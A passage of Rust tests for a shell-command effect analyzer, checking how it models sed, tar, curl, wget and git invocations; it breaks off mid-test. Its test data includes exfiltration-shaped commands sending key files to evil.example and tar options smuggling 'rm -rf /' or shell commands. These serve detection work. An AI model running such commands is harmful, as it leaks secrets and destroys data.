    let plan = analyze(&["sed", "s/a/b/", "f"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/f"));
    assert!(!has_effect(&plan, "filesystem.write", "/w/f"));
    assert_eq!(
        attr(&plan, "filesystem.read", "access_purpose"),
        Some(AttrValue::String("program_input".into()))
    );
}

#[test]
fn sed_pure_script_has_no_boundary() {
    // Substitutions, deletions, and prints only touch the stream.
    for argv in [
        vec!["sed", "s/a/b/"],
        vec!["sed", "-n", "s/.* -> \\(.*\\)/\\1/p"],
        vec!["sed", "-e", "s/^[[:space:]]*//", "-e", "/^#/d", "f"],
        vec!["sed", "-e", "1d;$d", "f"],
    ] {
        let plan = analyze(&argv, Some("/w"));
        assert!(
            !has_boundary(&plan, "unparsed_script"),
            "{argv:?} kept a boundary"
        );
    }
}

#[test]
fn sed_effectful_or_opaque_script_keeps_boundary() {
    // `w` writes a file, `s///w` too, `e` executes, and a `-f` script file
    // or unknown flag hides the script from inspection.
    for argv in [
        vec!["sed", "w /tmp/out", "f"],
        vec!["sed", "s/a/b/w out", "f"],
        vec!["sed", "e ls", "f"],
        vec!["sed", "-f", "cmds.sed", "f"],
        vec!["sed", "--weird", "s/a/b/", "f"],
    ] {
        let plan = analyze(&argv, Some("/w"));
        assert!(
            has_boundary(&plan, "unparsed_script"),
            "{argv:?} dropped the boundary"
        );
    }
    let plan = analyze(&["sed", "-f", "cmds.sed", "f"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/cmds.sed"));
    assert_eq!(
        plan.coverage.0[&Domain::new("filesystem")].level,
        CoverageLevel::Partial
    );
}

// ---- ls / stat ----

#[test]
fn ls_reads_operand_metadata() {
    let plan = analyze(&["ls", "-1qA", "node_modules"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/node_modules"));
    assert_eq!(
        attr(&plan, "filesystem.read", "metadata"),
        Some(AttrValue::Bool(true))
    );
    assert!(!has_boundary(&plan, "unrecognized_arguments"));
}

#[test]
fn ls_without_operand_reads_cwd() {
    let plan = analyze(&["ls", "-la"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w"));

    let plan = analyze(&["ls", "-R", "src"], Some("/w"));
    assert_eq!(
        attr(&plan, "filesystem.read", "recursive"),
        Some(AttrValue::Bool(true))
    );
}

#[test]
fn stat_format_value_is_not_a_file() {
    let plan = analyze(&["stat", "-c", "%s", "f"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/f"));
    assert!(!has_effect(&plan, "filesystem.read", "/w/%s"));
    assert_eq!(
        attr(&plan, "filesystem.read", "metadata"),
        Some(AttrValue::Bool(true))
    );
}

// ---- tar ----

#[test]
fn tar_create_old_style() {
    let plan = analyze(&["tar", "cf", "arch.tar", "src"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.write", "/w/arch.tar"));
    assert!(has_effect(&plan, "filesystem.read", "/w/src"));

    let plan = analyze(&["tar", "fc", "-", "secret"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/secret"));
    assert!(!ops(&plan).iter().any(|(o, _)| *o == "filesystem.write"));

    let plan = analyze(&["tar", "-fc", "-", "secret"], Some("/w"));
    assert!(
        !ops(&plan)
            .iter()
            .any(|(operation, _)| { matches!(*operation, "filesystem.read" | "filesystem.write") })
    );

    let plan = analyze(&["tar", "-cfarchive.tar", "secret"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.write", "/w/archive.tar"));
    assert!(has_effect(&plan, "filesystem.read", "/w/secret"));
}

#[test]
fn tar_create_to_stdout_has_no_archive_write() {
    let plan = analyze(&["tar", "cf", "-", "staging"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/staging"));
    assert!(!ops(&plan).iter().any(|(o, _)| *o == "filesystem.write"));
    for argv in [
        vec!["tar", "-xOf", "payload.tar", "script.sh"],
        vec![
            "tar",
            "--extract",
            "--to-stdout",
            "--file=payload.tar",
            "script.sh",
        ],
    ] {
        let plan = Engine::new()
            .with_causality_detail(true)
            .analyze(&Subject::Shell {
                source: format!("{} | cat", argv.join(" ")),
                cwd: Some("/w".into()),
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        assert!(has_effect(&plan, "filesystem.read", "/w/payload.tar"));
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.write")
        );
        let graph = plan.causality.graph.as_ref().unwrap();
        assert!(graph.edges.iter().any(|edge| {
            graph.nodes.iter().any(|node| node.id == edge.from && matches!(&node.occurrence, effinterp_proto::OccurrenceKind::ResourceInteraction { operation, .. } if operation.0 == "filesystem.read"))
                && graph.nodes.iter().any(|node| node.id == edge.to && matches!(&node.occurrence, effinterp_proto::OccurrenceKind::ResourceInteraction { operation, .. } if operation.0 == "process.stream_transform"))
        }), "{argv:?}: {graph:#?}");
        assert!(graph.edges.iter().any(|edge| {
            graph.nodes.iter().any(|node| node.id == edge.from && matches!(&node.occurrence, effinterp_proto::OccurrenceKind::ResourceInteraction { operation, .. } if operation.0 == "process.stream_transform"))
                && graph.nodes.iter().any(|node| node.id == edge.to && matches!(&node.occurrence, effinterp_proto::OccurrenceKind::Port { port: effinterp_proto::Port::Stdout }))
        }), "{argv:?}: {graph:#?}");
    }
}

#[test]
fn tar_extract_writes_pattern_under_target_dir() {
    for (source, operation) in [
        (
            "tar --create --file=\"$ARCHIVE\" /known",
            "filesystem.write",
        ),
        ("tar --list --file=\"$ARCHIVE\"", "filesystem.read"),
        (
            "tar --extract -f /known --directory=\"$DEST\"",
            "filesystem.write",
        ),
    ] {
        let plan = Engine::new()
            .analyze(&Subject::Shell {
                source: source.into(),
                cwd: None,
                context: HostContext {
                    env_unset: BTreeSet::from(["TAR_OPTIONS".into()]),
                    ..Default::default()
                },
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == operation
                    && !matches!(effect.resource, ResourceExpr::Concrete { .. })),
            "{source}"
        );
        assert!(
            !plan
                .boundaries
                .iter()
                .any(|boundary| boundary.domains.iter().any(|d| d.0 == "filesystem")),
            "{source}"
        );
    }
    let plan = analyze(&["tar", "-xzf", "a.tgz", "-C", "/out"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/a.tgz"));
    assert!(has_effect(&plan, "filesystem.write", "pat:/out/**"));

    let plan = analyze(&["tar", "xf", "a.tar"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.write", "pat:/w/**"));
    for effect in plan
        .effects
        .iter()
        .filter(|effect| effect.operation.0 == "filesystem.write")
    {
        let ResourceExpr::Pattern {
            pattern: effinterp_proto::ResourcePattern::FsPath { glob: pattern },
        } = &effect.resource
        else {
            panic!("expected recursive extraction pattern")
        };
        for target in ["/w/a/b", "/w/.hidden/x"] {
            assert_eq!(effinterp_proto::glob_match(pattern, target), Ok(true));
        }
    }
}

#[test]
fn tar_command_options_are_not_archive_operands() {
    for argv in [
        &[
            "tar",
            "cf",
            "archive.tar",
            "--to-command",
            "sh -c 'touch /tmp/split'",
            "src",
        ][..],
        &[
            "tar",
            "cf",
            "archive.tar",
            "--to-command=sh -c 'touch /tmp/attached'",
            "src",
        ][..],
        &[
            "tar",
            "cf",
            "archive.tar",
            "--checkpoint-action",
            "exec=touch /tmp/split",
            "src",
        ][..],
        &[
            "tar",
            "cf",
            "archive.tar",
            "--checkpoint-action=exec=touch /tmp/attached",
            "src",
        ][..],
    ] {
        let plan = analyze(argv, Some("/w"));
        let reads = ops(&plan)
            .into_iter()
            .filter_map(|(operation, resource)| {
                (operation == "filesystem.read").then_some(resource)
            })
            .collect::<Vec<_>>();
        assert_eq!(reads, vec!["/w/src"], "{argv:?}");
        // A checkpoint `exec=` action is a shell command line tar runs.
        if argv[3].starts_with("--checkpoint-action") {
            assert!(
                ops(&plan)
                    .iter()
                    .any(|(_, resource)| resource.starts_with("/tmp/")),
                "{argv:?}"
            );
            continue;
        }
        assert!(has_boundary(&plan, "unmodeled_subprocess"), "{argv:?}");
        assert_eq!(
            plan.coverage.0[&Domain::new("filesystem")].level,
            CoverageLevel::Partial,
            "{argv:?}"
        );
        assert_eq!(
            plan.coverage.0[&Domain::new("process")].level,
            CoverageLevel::Partial,
            "{argv:?}"
        );
    }
}

#[test]
fn tar_compressor_programs_are_consumed_and_bounded() {
    // A literal compressor program is a command line tar runs: it is analyzed
    // as one, and its operands stay out of the archive's member list.
    for argv in [
        &["tar", "-cI", "rm -rf /", "-f", "-", "src"][..],
        &["tar", "-cIrm -rf /", "-f", "-", "src"][..],
        &[
            "tar",
            "--create",
            "--use-compress-program",
            "rm -rf /",
            "--file=-",
            "src",
        ][..],
        &[
            "tar",
            "--create",
            "--use-compress-program=rm -rf /",
            "--file=-",
            "src",
        ][..],
    ] {
        let plan = analyze(argv, Some("/w"));
        let reads = ops(&plan)
            .into_iter()
            .filter_map(|(operation, resource)| {
                (operation == "filesystem.read").then_some(resource)
            })
            .collect::<Vec<_>>();
        assert_eq!(reads, vec!["/w/src"], "{argv:?}");
        assert!(!has_boundary(&plan, "unmodeled_subprocess"), "{argv:?}");
        assert!(
            ops(&plan)
                .into_iter()
                .any(|(operation, resource)| operation == "filesystem.delete" && resource == "/"),
            "{argv:?}"
        );
    }

    for argv in [
        &["tar", "-czf", "-", "src"][..],
        &["tar", "-cjf", "-", "src"][..],
        &["tar", "-cJf", "-", "src"][..],
        &["tar", "-cZf", "-", "src"][..],
        &["tar", "--create", "--gzip", "--file=-", "src"][..],
        &["tar", "--create", "--bzip2", "--file=-", "src"][..],
        &["tar", "--create", "--xz", "--file=-", "src"][..],
        &["tar", "--create", "--zstd", "--file=-", "src"][..],
    ] {
        let plan = analyze(argv, Some("/w"));
        let reads = ops(&plan)
            .into_iter()
            .filter_map(|(operation, resource)| {
                (operation == "filesystem.read").then_some(resource)
            })
            .collect::<Vec<_>>();
        assert_eq!(reads, vec!["/w/src"], "{argv:?}");
        assert!(!has_boundary(&plan, "unmodeled_subprocess"), "{argv:?}");
    }
}

#[test]
fn tar_environment_selected_options_and_archives_are_bounded() {
    let default_options = analyze(&["tar", "cf", "-", "src"], Some("/w"));
    assert!(default_options.effects.iter().any(|effect| {
        effect.operation.0 == "environment.read"
            && matches!(&effect.resource, ResourceExpr::Concrete {
                identity: ResourceIdentity::EnvironmentVariable { name }
            } if name == "TAR_OPTIONS")
    }));
    assert!(!default_options.effects.iter().any(|effect| {
        effect.operation.0 == "environment.read"
            && matches!(&effect.resource, ResourceExpr::Concrete {
                identity: ResourceIdentity::EnvironmentVariable { name }
            } if name == "TAPE")
    }));
    assert!(!default_options.boundaries.iter().any(|boundary| {
        boundary
            .detail
            .as_deref()
            .is_some_and(|detail| detail.contains("TAR_OPTIONS"))
    }));

    let default_archive = Engine::new()
        .analyze(&Subject::Exec {
            argv: ["tar", "c", "src"].map(str::to_string).to_vec(),
            cwd: Some("/w".into()),
            context: HostContext {
                env_unset: BTreeSet::from(["TAR_OPTIONS".into(), "TAPE".into()]),
                ..Default::default()
            },
        })
        .unwrap();
    for name in ["TAR_OPTIONS", "TAPE"] {
        assert!(default_archive.effects.iter().any(|effect| {
            effect.operation.0 == "environment.read"
                && matches!(&effect.resource, ResourceExpr::Concrete {
                    identity: ResourceIdentity::EnvironmentVariable { name: actual }
                } if actual == name)
        }));
    }
    assert!(default_archive.boundaries.iter().any(|boundary| {
        boundary
            .detail
            .as_deref()
            .is_some_and(|detail| detail.contains("TAPE"))
    }));

    // `--force-local` makes a colon-bearing TAPE name a local file, so the
    // archive must never be reported as a transfer to the host before the colon.
    let forced = Engine::new()
        .analyze(&Subject::Exec {
            argv: ["tar", "--force-local", "-c", "src"]
                .map(str::to_string)
                .to_vec(),
            cwd: Some("/w".into()),
            context: HostContext {
                env: BTreeMap::from([(
                    "TAPE".to_string(),
                    "evil.example:/tmp/archive".to_string(),
                )]),
                env_unset: BTreeSet::from(["TAR_OPTIONS".into()]),
                ..Default::default()
            },
        })
        .unwrap();
    assert!(
        !forced
            .effects
            .iter()
            .any(|effect| effect.operation.0.starts_with("network.")),
        "{:?}",
        forced.effects
    );
    assert!(has_effect(
        &forced,
        "filesystem.write",
        "/w/evil.example:/tmp/archive"
    ));
    assert!(
        !forced.boundaries.iter().any(|boundary| {
            boundary
                .detail
                .as_deref()
                .is_some_and(|detail| detail.contains("--force-local"))
        }),
        "{:?}",
        forced.boundaries
    );
}

// ---- curl / wget ----

#[test]
fn curl_plain_request() {
    let plan = analyze(&["curl", "evil.example"], Some("/w"));
    assert!(has_effect(&plan, "network.request", "net:evil.example"));
    assert_eq!(
        plan.coverage.0[&Domain::new("network")].level,
        CoverageLevel::Full
    );
}

#[test]
fn curl_data_at_file_is_exfil_shape() {
    let plan = analyze(&["curl", "-d", "@secret.key", "evil.example"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/secret.key"));
    assert!(has_effect(&plan, "network.upload", "net:evil.example"));
    assert!(!ops(&plan).iter().any(|(o, _)| *o == "network.request"));
}

#[test]
fn curl_data_stdin_uploads_without_file_read() {
    let plan = analyze(&["curl", "--data-binary", "@-", "evil.example"], Some("/w"));
    assert!(has_effect(&plan, "network.upload", "net:evil.example"));
    assert!(!ops(&plan).iter().any(|(o, _)| *o == "filesystem.read"));
}

#[test]
fn curl_upload_file() {
    let plan = analyze(
        &["curl", "--upload-file", "loot", "evil.example"],
        Some("/w"),
    );
    assert!(has_effect(&plan, "filesystem.read", "/w/loot"));
    assert!(has_effect(&plan, "network.upload", "net:evil.example"));
}

#[test]
fn curl_output_and_remote_name() {
    let plan = analyze(&["curl", "-o", "out.txt", "https://x.com/f"], Some("/w"));
    assert!(has_effect(&plan, "network.download", "net:https://x.com/f"));
    assert!(has_effect(&plan, "filesystem.write", "/w/out.txt"));

    let plan = analyze(&["curl", "-O", "https://x.com/path/file.bin"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.write", "/w/file.bin"));
}

#[test]
fn curl_header_value_is_not_a_url() {
    let plan = analyze(&["curl", "-H", "X-Auth: 1", "https://x.com"], Some("/w"));
    assert_eq!(
        ops(&plan)
            .iter()
            .filter(|(o, _)| o.starts_with("network."))
            .count(),
        1
    );
}

#[test]
fn curl_unknown_flag_degrades() {
    let plan = analyze(&["curl", "--weird", "https://x.com"], Some("/w"));
    assert!(has_boundary(&plan, "unrecognized_arguments"));
    assert_eq!(
        plan.coverage.0[&Domain::new("network")].level,
        CoverageLevel::Partial
    );
}

#[test]
fn curl_symbolic_url_is_unresolved_endpoint() {
    let plan = Engine::new()
        .analyze(&Subject::Exec {
            argv: vec!["curl".into()],
            cwd: Some("/w".into()),
            context: Default::default(),
        })
        .unwrap();
    // No URL at all: no network effect, coverage still declared.
    assert!(!ops(&plan).iter().any(|(o, _)| o.starts_with("network.")));
    validate_plan(&plan).unwrap();
}

#[test]
fn wget_default_writes_url_basename() {
    let plan = analyze(&["wget", "https://x.com/a/b.txt"], Some("/w"));
    assert!(has_effect(
        &plan,
        "network.download",
        "net:https://x.com/a/b.txt"
    ));
    assert!(has_effect(&plan, "filesystem.write", "/w/b.txt"));
}

#[test]
fn wget_output_and_prefix() {
    let plan = analyze(&["wget", "-O", "out", "https://x.com"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.write", "/w/out"));

    let plan = analyze(&["wget", "-P", "/dl", "https://x.com/f.iso"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.write", "/dl/f.iso"));
}

#[test]
fn wget_post_file_uploads() {
    let plan = analyze(&["wget", "--post-file=k.pem", "evil.example"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/k.pem"));
    assert!(has_effect(&plan, "network.upload", "net:evil.example"));
}

#[test]
fn wget_input_file_is_a_boundary() {
    let plan = analyze(&["wget", "-i", "urls.txt"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/urls.txt"));
    assert!(has_effect(&plan, "network.download", "?network"));
    assert!(has_boundary(&plan, "unread_config"));
}

// ---- git ----

#[test]
fn git_status_is_a_read() {
    let plan = analyze(&["git", "status"], Some("/w"));
    assert!(
        !plan
            .effects
            .iter()
            .any(|effect| effect.operation.domain() == "network")
    );
    assert!(has_effect(&plan, "git.read", "/w"));
    assert_eq!(
        plan.coverage.0[&Domain::new("git")].level,
        CoverageLevel::Full
    );
}

#[test]
fn git_add_reads_pathspecs_as_program_input() {
    let plan = analyze(&["git", "add", ".env"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.read", "/w/.env"));
    assert_eq!(
        attr(&plan, "filesystem.read", "access_purpose"),
        Some(AttrValue::String("program_input".into()))
    );
    let dry_run = analyze(&["git", "add", "-n", ".env"], Some("/w"));
    assert_eq!(attr(&dry_run, "filesystem.read", "access_purpose"), None);
}

#[test]
fn git_dash_c_changes_repo_dir() {
    let plan = analyze(&["git", "-C", "/repo", "status"], Some("/w"));
    assert!(has_effect(&plan, "git.read", "/repo"));
}

#[test]
fn git_wrapper_options_end_at_the_subcommand() {
    // The wrapper has no `--` separator, so `git -- push` never reaches push.
    let plan = analyze(&["git", "--", "push", "--force"], Some("/w"));
    assert!(command_effects(&plan).is_empty());
    assert!(plan.boundaries.is_empty());
    // A `-c` name outside the alias section cannot rename a subcommand, even
    // when its value is not readable.
    let plan = Engine::new()
        .analyze(&Subject::Shell {
            source: "git -c \"user.name=$NAME\" status".into(),
            cwd: Some("/w".into()),
            context: HostContext::default(),
        })
        .unwrap();
    assert!(has_effect(&plan, "git.read", "/w"));
    assert!(plan.boundaries.is_empty());
    let plan = Engine::new()
        .analyze(&Subject::Shell {
            source: "git -c \"alias.wipe=$ALIAS\" wipe".into(),
            cwd: Some("/w".into()),
            context: HostContext::default(),
        })
        .unwrap();
    assert!(has_boundary(&plan, "unresolved_alias"));
}

#[test]
fn git_reset_hard_discards_worktree() {
    // `--help` is matched exactly and never competes with the abbreviation of
    // a real option, so `--h` stays `--hard`.
    let plan = analyze(&["git", "reset", "--h"], Some("/w"));
    assert!(has_effect(&plan, "git.worktree_discard", "/w"));
    let plan = analyze(&["git", "reset", "--hard", "--help"], Some("/w"));
    assert!(command_effects(&plan).is_empty());
    assert!(plan.boundaries.is_empty());
    let plan = analyze(&["git", "reset", "--hard"], Some("/w"));
    assert!(has_effect(&plan, "git.worktree_discard", "/w"));
    let request = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "git.reset_request")
        .expect("reset request");
    assert_eq!(
        request.request_assurance,
        effinterp_proto::RequestAssurance::Exact
    );
    assert_eq!(request.modality, effinterp_proto::Modality::MustOnSuccess);
    assert_eq!(
        request.attributes.get("dry_run"),
        Some(&AttrValue::Bool(false))
    );
    assert_eq!(
        request.attributes.get("discard_mode"),
        Some(&AttrValue::String("reset".into()))
    );
    assert_eq!(
        request.attributes.get("reset_mode"),
        Some(&AttrValue::String("hard".into()))
    );
    assert_eq!(
        attr(&plan, "git.worktree_discard", "hard"),
        Some(AttrValue::Bool(true))
    );

    for mode in ["--merge", "--keep"] {
        let plan = analyze(&["git", "reset", mode], Some("/w"));
        assert_eq!(
            attr(&plan, "git.worktree_discard", "hard"),
            Some(AttrValue::Bool(false))
        );
        assert_eq!(
            attr(&plan, "git.worktree_discard", "reset_mode"),
            Some(AttrValue::String(mode[2..].into()))
        );
    }

    for argv in [
        vec!["git", "reset", "--", "--hard"],
        vec!["git", "reset", "--hard", "--", "path"],
        vec!["git", "reset", "--hard", "--soft"],
    ] {
        let plan = analyze(&argv, Some("/w"));
        assert!(
            !plan
                .effects
                .iter()
                .any(|e| e.operation.0 == "git.worktree_discard"),
            "{argv:?}"
        );
        if argv[2] == "--hard" {
            assert!(has_boundary(&plan, "unrecognized_arguments"), "{argv:?}");
        }
        if argv[2] == "--" {
            assert!(has_effect(&plan, "git.index_write", "/w"));
            assert!(
                !plan
                    .effects
                    .iter()
                    .any(|e| e.operation.0 == "git.ref_update")
            );
        }
    }

    // Git accepts any unambiguous long-option prefix: `--h` is `--hard`.
    let plan = analyze(&["git", "reset", "--h"], Some("/w"));
    assert!(has_effect(&plan, "git.worktree_discard", "/w"));

    let symbolic = Engine::new()
        .analyze(&Subject::Shell {
            source: r#"git reset --hard "$REV""#.into(),
            cwd: Some("/w".into()),
            context: Default::default(),
        })
        .unwrap();
    let request = symbolic
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "git.reset_request")
        .unwrap_or_else(|| panic!("symbolic reset request: {:?}", symbolic.effects));
    assert_eq!(
        request.attributes.get("target_complete"),
        Some(&AttrValue::Bool(false))
    );
    assert_eq!(request.attributes.get("hard"), Some(&AttrValue::Bool(true)));
    let patch = analyze(&["git", "reset", "--patch"], Some("/w"));
    assert!(
        !patch
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "git.reset_request")
    );
}

#[test]
fn git_checkout_pathspec_discards_paths() {
    for cwd in [None, Some("relative")] {
        let plan = analyze(&["git", "restore", "./file"], cwd);
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "git.worktree_discard_request")
        );
    }

    let plan = analyze(&["git", "checkout", "--", "."], Some("/w"));
    assert!(has_effect(&plan, "git.worktree_discard", "/w"));
    let request = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "git.worktree_discard_request")
        .expect("checkout request");
    assert_eq!(
        request.attributes.get("selections"),
        Some(&strings(&["/w"]))
    );
    assert_eq!(
        request.attributes.get("root_uses_invocation_cwd"),
        Some(&AttrValue::Bool(true))
    );

    let plan = analyze(&["git", "checkout", "--", "./file"], Some("/w"));
    let request = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "git.worktree_discard_request")
        .expect("relative checkout request");
    assert_eq!(
        request.attributes.get("selections"),
        Some(&strings(&["/w/file"]))
    );

    let plan = analyze(&["git", "restore", ":/"], Some("/w"));
    assert!(has_effect(&plan, "filesystem.write", "/w"));
    assert!(!has_boundary(&plan, "unrecognized_arguments"));
    let discard = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "git.worktree_discard")
        .expect("top-magic restore discard");
    assert!(matches!(&discard.resource, ResourceExpr::Concrete {
        identity: ResourceIdentity::GitRepository { pathspec: Some(pathspec), .. }
    } if matches!(pathspec.as_ref(), ResourceExpr::Concrete {
        identity: ResourceIdentity::FsPath { path }
    } if path == ".")));
    assert_eq!(
        attr(&plan, "git.worktree_discard_request", "selections"),
        Some(strings(&["/w"]))
    );
    // A whole-tree pathspec states the top git discovers, like clean does;
    // a named work tree is its own top, and a named path is not the top.
    for (argv, selects_top) in [
        (&["git", "restore", ":/"][..], Some(AttrValue::Bool(true))),
        (
            &["git", "checkout", "--", ":(top)"],
            Some(AttrValue::Bool(true)),
        ),
        (&["git", "restore", ":/", "a"], Some(AttrValue::Bool(true))),
        (&["git", "--work-tree=/w", "restore", ":/"], None),
        (&["git", "restore", "a"], None),
    ] {
        let plan = analyze(argv, Some("/w/src"));
        assert!(
            attr(&plan, "git.worktree_discard_request", "selections").is_some(),
            "{argv:?}"
        );
        assert_eq!(
            attr(&plan, "git.worktree_discard_request", "selects_top"),
            selects_top,
            "{argv:?}"
        );
    }

    // Restoring a pathspec overwrites the working-tree entry it names. A
    // consumer reading only the git domain cannot see which host path a
    // restore replaces, and an index-only restore must not claim one.
    for argv in [
        ["git", "restore", "trust.json"].as_slice(),
        ["git", "checkout", "--", "trust.json"].as_slice(),
        ["git", "restore", "--staged", "--worktree", "trust.json"].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(
            has_effect(&plan, "filesystem.write", "/w/trust.json"),
            "{argv:?}"
        );
        assert_eq!(
            attr(&plan, "filesystem.write", "disclosure"),
            Some(AttrValue::String("contents".into())),
            "{argv:?}"
        );
    }
    for argv in [
        ["git", "restore", "--staged", "trust.json"].as_slice(),
        ["git", "checkout", "main"].as_slice(),
        ["git", "switch", "main"].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "filesystem.write"),
            "{argv:?}"
        );
    }
    for argv in [
        ["git", "restore", "--staged", "trust.json"].as_slice(),
        ["git", "restore", "--staged", "--worktree", "trust.json"].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == "git.index_write"),
            "{argv:?}"
        );
    }
    let plan = analyze(&["git", "restore", "--staged"], Some("/w"));
    assert!(
        !plan
            .effects
            .iter()
            .any(|effect| effect.operation.0 == "git.index_write")
    );

    // Regression: `-W`, `-s REV` and `--source REV` left the discard request
    // unproven and read REV as a second pathspec, so git-path-discard went
    // silent on the documented short and separate-value spellings.
    for argv in [
        ["git", "restore", "-W", "src/lib.rs"].as_slice(),
        ["git", "restore", "--source", "HEAD", "src/lib.rs"].as_slice(),
        ["git", "restore", "-s", "main", "--", "src/lib.rs"].as_slice(),
        ["git", "restore", "-smain", "src/lib.rs"].as_slice(),
        ["git", "restore", "-SWs", "main", "src/lib.rs"].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        let request = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "git.worktree_discard_request")
            .unwrap_or_else(|| panic!("{argv:?}"));
        assert_eq!(
            request.attributes.get("selections"),
            Some(&strings(&["/w/src/lib.rs"])),
            "{argv:?}"
        );
    }
    // Regression: a source option without its value was re-spelled
    // unchanged and planned again forever, overflowing the stack. git
    // rejects it before restoring anything.
    for argv in [
        ["git", "restore", "-s"].as_slice(),
        ["git", "restore", "--source"].as_slice(),
        ["git", "restore", "-Ws"].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0.starts_with("git.worktree_discard")),
            "{argv:?}"
        );
    }
    // `-S` alone restores only the index.
    let plan = analyze(&["git", "restore", "-S", "src/lib.rs"], Some("/w"));
    assert!(has_effect(&plan, "git.index_write", "/w"));
    assert!(
        !plan
            .effects
            .iter()
            .any(|effect| effect.operation.0.starts_with("git.worktree_discard"))
    );

    for argv in [
        ["git", "restore", "."].as_slice(),
        ["git", "restore", "src/lib.rs"].as_slice(),
        ["git", "checkout", "HEAD", "--", "."].as_slice(),
        ["git", "checkout", "HEAD", "."].as_slice(),
        ["git", "checkout", "."].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == "git.worktree_discard_request"),
            "plain Git path was not certified: {argv:?}"
        );
        assert_eq!(
            attr(&plan, "git.worktree_discard", "discard_mode"),
            Some(AttrValue::String(argv[1].into()))
        );
    }

    for argv in [
        vec!["git", "checkout", "HEAD", "."],
        vec!["git", "checkout", "HEAD", "--", "."],
        vec!["git", "checkout", "."],
        vec!["git", "restore", "."],
    ] {
        let plan = analyze(&argv, Some("/w"));
        assert_eq!(
            attr(&plan, "git.worktree_discard_request", "selections"),
            Some(strings(&["/w"])),
            "{argv:?}"
        );
    }
    for argv in [
        vec!["git", "checkout", "HEAD", ".", "named"],
        vec!["git", "checkout", "HEAD", "--", ".", "named"],
        vec!["git", "restore", ".", "named"],
    ] {
        let plan = analyze(&argv, Some("/w"));
        assert_eq!(
            attr(&plan, "git.worktree_discard_request", "selections"),
            Some(strings(&["/w", "/w/named"])),
            "{argv:?}"
        );
    }

    for argv in [
        ["git", "restore", "src/*"].as_slice(),
        ["git", "checkout", "--", "src/*"].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.0 == "git.worktree_discard"),
            "conservative pathspec discard disappeared: {argv:?}"
        );
        assert_eq!(
            attr(&plan, "git.worktree_discard", "discard_mode"),
            Some(AttrValue::String(argv[1].into()))
        );
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "git.worktree_discard_request"),
            "non-plain pathspec was certified as a literal path: {argv:?}"
        );
        assert!(
            has_boundary(&plan, "unrecognized_arguments"),
            "unmodeled pathspec did not retain a boundary: {argv:?}"
        );
    }

    let invalid = analyze(&["git", "checkout", "HEAD", "HEAD", "--", "."], Some("/w"));
    assert!(
        !invalid.effects.iter().any(|effect| matches!(
            effect.operation.0.as_str(),
            "git.worktree_discard" | "git.worktree_discard_request"
        )),
        "invalid checkout produced a discard mutation: {:?}",
        invalid.effects
    );
    assert!(!has_boundary(&invalid, "unrecognized_arguments"));

    let plan = analyze(
        &["git", "-C", "/repo", "checkout", "--", "./file"],
        Some("/w"),
    );
    let request = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "git.worktree_discard_request")
        .expect("-C checkout request");
    assert_eq!(
        request.attributes.get("selections"),
        Some(&strings(&["/repo/file"]))
    );

    let plan = analyze(&["git", "checkout", "."], Some("/w"));
    assert!(has_effect(&plan, "git.worktree_discard", "/w"));

    for argv in [
        ["git", "checkout", "--unknown", "."].as_slice(),
        ["git", "restore", "--unknown", "file"].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "git.worktree_discard_request"),
            "unrecognized checkout control was certified: {argv:?}"
        );
    }

    // After `-b/-B/--orphan <name>` the operand is git's start point, a
    // revision: it is the branch creation's target, never a pathspec.
    for argv in [
        ["git", "checkout", "-f", "-b", "topic", "origin/other"].as_slice(),
        ["git", "checkout", "-f", "--orphan", "topic", "origin/other"].as_slice(),
        ["git", "switch", "-f", "-c", "topic", "origin/other"].as_slice(),
    ] {
        let plan = analyze(argv, Some("/w"));
        assert!(has_effect(&plan, "git.worktree_discard", "/w"), "{argv:?}");
        assert_eq!(
            attr(&plan, "git.worktree_discard", "discard_mode"),
            Some(AttrValue::String(argv[1].into()))
        );
        let request = plan
            .effects
